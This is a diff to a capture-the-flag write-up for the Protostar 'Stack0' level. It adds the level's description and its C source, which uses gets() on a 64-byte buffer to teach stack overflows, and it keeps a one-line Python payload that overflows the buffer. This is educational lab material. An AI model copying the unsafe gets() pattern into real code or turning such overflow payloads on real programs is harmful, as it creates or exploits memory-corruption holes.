@@ -2,6 +2,35 @@
 TL;DR -> python -c "print 'A'*(4 + 16*3 + 14)" | ./stack0
 ```
 
+# Stack0
+
+URL: https://exploit.education/protostar/stack-zero/
+This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
+
+This level is at /opt/protostar/bin/stack0
+
+Source code
+
+```#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  modified = 0;
+  gets(buffer);
+
+  if(modified != 0) {
+      printf("you have changed the 'modified' variable\n");
+  } else {
+      printf("Try again?\n");
+  }
+}
+```
+
 # Writeup
 
 When we run the binary, it is asking for input
